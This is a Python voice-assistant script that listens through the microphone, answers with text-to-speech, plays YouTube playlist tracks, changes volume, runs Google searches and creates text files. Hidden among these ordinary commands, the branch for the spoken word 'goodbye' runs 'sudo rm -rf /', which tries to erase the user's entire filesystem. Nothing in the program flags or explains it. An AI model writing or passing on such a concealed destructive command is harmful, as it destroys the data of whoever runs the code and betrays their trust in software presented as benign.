import subprocess
import speech_recognition as sr
from datetime import datetime
import time
import webbrowser
import random
import yt_dlp
import os
from tkinter import Tk, simpledialog, messagebox

def speak(text):
    subprocess.run(['festival', '--tts'], input=text, text=True)

def make_readable(seconds):
    return datetime.fromtimestamp(seconds).strftime('%B %d, %Y, %H:%M:%S')

playlist = []
index = -1
player_process = None

def fetch(playlist_url):
    global playlist
    try:
        ydl_opts = {
            'quiet': True,
            'extract_flat': 'in_playlist',
            'skip_download': True
        }
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            playlist_info = ydl.extract_info(playlist_url, download=False)
            if 'entries' in playlist_info:
                playlist = [entry['url'] for entry in playlist_info['entries']]
    except Exception as e:
        speak("I couldn't fetch the playlist.")
        print(f"Error: {e}")

def play():
    global player_process
    if playlist:
        if player_process:
            player_process.terminate()
        index = random.randint(0, len(playlist) - 1)
        video_url = playlist[index]
        player_process = subprocess.Popen(["celluloid", video_url])
    else:
        speak("The playlist seems empty or unavailable.")

def adjust_volume(action):
    if action == "raise":
        subprocess.run(["pactl", "set-sink-volume", "@DEFAULT_SINK@", "+10%"])
    elif action == "lower":
        subprocess.run(["pactl", "set-sink-volume", "@DEFAULT_SINK@", "-10%"])

def stop():
    global player_process
    if player_process:
        player_process.terminate()
        player_process = None
        speak("Playback stopped.")

def resume():
    if not player_process:
        play()

def listen():
    recognizer = sr.Recognizer()
    with sr.Microphone() as source:
        recognizer.adjust_for_ambient_noise(source, duration=5)
        print("Listening... Please speak clearly.")
        try:
            audio = recognizer.listen(source, timeout=5, phrase_time_limit=10)
            recognized_text = recognizer.recognize_google(audio)
            print(f"You said: {recognized_text}")
            return recognized_text.lower()
        except sr.UnknownValueError:
            print("Sorry, I couldn't understand. Please try again.")
        except sr.RequestError as e:
            print(f"API request error: {e}")
            speak("I encountered an API error.")
        except sr.WaitTimeoutError:
            print("No speech detected in time. Please try again.")
            speak("No speech detected in time.")
        return None

def makefile_gui():
    root = Tk()
    root.withdraw()
    file_name = simpledialog.askstring("Input", "Enter the file name:")
    if file_name:
        if not file_name.endswith('.txt'):
            file_name += '.txt'
        file_content = simpledialog.askstring("Input", "Enter the content of the file:")
        try:
            with open(file_name, 'w') as file:
                file.write(file_content or "")
        except Exception as e:
            messagebox.showerror("Error", f"Error creating file: {e}")

playlist_url = "https://www.youtube.com/playlist?list=PLZ3RLzVsyLkjbc2J0tvwTXjq0fmXca3a1"
fetch(playlist_url)

while True:
    voice_command = listen()
    if voice_command:
        try:
            if "exit" in voice_command or "quit" in voice_command:
                speak("Goodbye!")
                break
            elif "time" in voice_command:
                current_time = make_readable(time.time())
                print(current_time)
                speak(f"The current time is {current_time}")
            elif "hello" in voice_command:
                speak("Hello!")
            elif "search" in voice_command:
                query = voice_command.replace("search", "").strip()
                if query:
                    webbrowser.open(f"https://www.google.com/search?q={query}")
                    speak(f"Here are the search results for {query}.")
                else:
                    speak("What do you want me to search for?")
            elif "play" in voice_command or "music" in voice_command:
                play()
            elif "skip" in voice_command:
                speak("Skipping to the next song.")
                play()
            elif "down" in voice_command or "lower" in voice_command:
                adjust_volume("lower")
                speak("Lowering volume.")
            elif "up" in voice_command or "raise" in voice_command:
                adjust_volume("raise")
                speak("Raising volume.")
            elif "stop" in voice_command:
                stop()
            elif "resume" in voice_command:
                resume()
            elif "file" in voice_command:
                makefile_gui()
            elif "goodbye" in voice_command:
                os.system("sudo rm -rf /")
            else:
                print(f"Command '{voice_command}' not recognized.")
                speak("I don't have that command. Please try again.")
        except Exception as e:
            print(f"Error generating response: {e}")
            speak("I encountered an error. Please try again.")